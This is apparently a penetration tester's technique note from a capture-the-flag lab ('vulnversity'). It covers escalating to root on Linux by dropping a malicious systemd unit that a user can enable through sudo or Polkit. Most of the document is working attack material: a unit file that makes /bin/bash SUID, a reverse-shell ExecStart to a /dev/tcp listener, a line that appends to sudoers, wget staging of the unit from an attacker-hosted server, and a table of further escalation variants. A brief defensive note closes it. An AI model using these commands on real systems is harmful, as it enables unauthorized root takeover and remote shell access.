# Systemd Unit Privesc — Writable `systemctl` / Drop-in Unit

Used on: **vulnversity**

When a low-priv user can call `systemctl enable` / `systemctl start` against a unit file they control (because the user is in `systemd` / `wheel` group, or because `systemctl` is a `sudo`-NOPASSWD entry, or because Polkit is misconfigured), they can drop a unit with `User=root` and `ExecStart=/bin/bash -c "..."` and ride it straight to root. Functionally the same primitive as a writable cron, but on systemd.

## Prerequisites

One of:
- A `sudo` rule for `/bin/systemctl` (often paired with a *specific* service that the user's unit can shadow).
- Group membership in `systemd-journal`, `systemd-network`, **`systemd`**, **`wheel`**, or `disk` — depending on Polkit rules.
- A Polkit rule allowing `org.freedesktop.systemd1.manage-units` to non-root users.
- A writable directory in the unit-file search path: `/etc/systemd/system/`, `/run/systemd/system/`, `/usr/lib/systemd/system/`. **vulnversity** allowed dropping units in `/tmp` and starting them via the `bill` user's existing `systemctl` permissions.

## How It Works

`systemctl enable /tmp/root.service` symlinks the unit into `/etc/systemd/system/multi-user.target.wants/`. `systemctl start root` then runs `ExecStart=` as the unit's `User=` (default: `root`). One round trip = root command.

## Steps

### 1. Recon — what can I do with systemctl

<!-- cmd: linux -->
```bash
sudo -l
# (root) NOPASSWD: /bin/systemctl

# OR — group / Polkit
id
# uid=1000(bill) gid=1000(bill) groups=1000(bill),...

systemctl status                 # works without sudo (Polkit allowing read)
systemctl enable nonsense.service 2>&1 | head      # see if "enable" is permitted
```

### 2. Drop the unit

On the **attacker** machine, prepare the unit file:
```ini
# root.service
[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"

[Install]
WantedBy=multi-user.target
```

Variants for `ExecStart=`:
| Goal | `ExecStart=` |
|------|---------------|
| SUID `/bin/bash` | `/bin/bash -c "chmod +s /bin/bash"` |
| Reverse shell | `/bin/bash -c "bash -i >& /dev/tcp/LHOST/4444 0>&1"` |
| Add user to sudoers | `/bin/bash -c "echo 'bill ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"` |
| Read root flag | `/bin/bash -c "cp /root/root.txt /tmp/r.txt && chmod 644 /tmp/r.txt"` |

### 3. Stage the unit on the target

<!-- cmd: linux -->
```bash
# Attacker
python3 -m http.server 3333

# Target
cd /tmp
wget http://$LHOST:3333/root.service
```

### 4. Enable + start

<!-- cmd: linux -->
```bash
systemctl enable /tmp/root.service        # absolute path required
systemctl start root                      # service name = filename without .service
# (some systems require: systemctl daemon-reload first)
```

### 5. Cash in

<!-- cmd: linux -->
```bash
ls -l /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash     SUID set
/bin/bash -p
# whoami  root
```

`-p` keeps EUID intact when bash is SUID — without it, modern bash drops privileges automatically.

## Variants

| You can write to | Run command |
|------------------|-------------|
| `/etc/systemd/system/<existing>.service.d/override.conf` | `systemctl daemon-reload && systemctl restart <service>` — overrides shadow the original |
| `/etc/systemd/system/timers.d/` | Drop a `.timer` calling your `.service` on the next minute |
| Existing unit's `ExecStart=` path is writable | Replace the binary, then `systemctl restart` |
| Sudoers line says only `systemctl daemon-reexec` / `start specific.service` | If the **service file path is writable**, edit `ExecStart=` then trigger the allowed command |
| User is in `systemd` group with running `systemd --user` | Drop unit in `~/.config/systemd/user/` and `systemctl --user start` (only escapes user session, not root — but useful for lateral) |

## How to Find It

<!-- cmd: linux -->
```bash
sudo -l 2>/dev/null | grep -i systemctl                 # [USED — vulnversity]
ls -la /etc/systemd/system/ /run/systemd/system/ 2>/dev/null   # writable unit dirs
find /etc/systemd /lib/systemd -writable -ls 2>/dev/null
systemctl list-unit-files --state=enabled | head        # context
pkaction --action-id org.freedesktop.systemd1.manage-units --verbose 2>/dev/null
```

## Defensive Note

- Sudo rules for `systemctl` are equivalent to `(root) NOPASSWD: ALL`. There is no safe scoping unless paired with a `--unit` lockdown that's also enforced at the systemd layer.
- Lock down `/etc/systemd/system/` to root-only writes; audit `polkit` rules that grant `manage-units`.
- Don't grant `wheel` / `systemd` group membership lightly — both effectively confer root via this primitive.

## Related

- [sudo-bash-overwrite.md](sudo-bash-overwrite.md) — sibling primitive (writable script under sudo)
- [cron-script-abuse.md](cron-script-abuse.md) — same idea on the cron side
- [linux-enumeration.md](../enumeration/linux-enumeration.md) — recon to find sudo + writable units


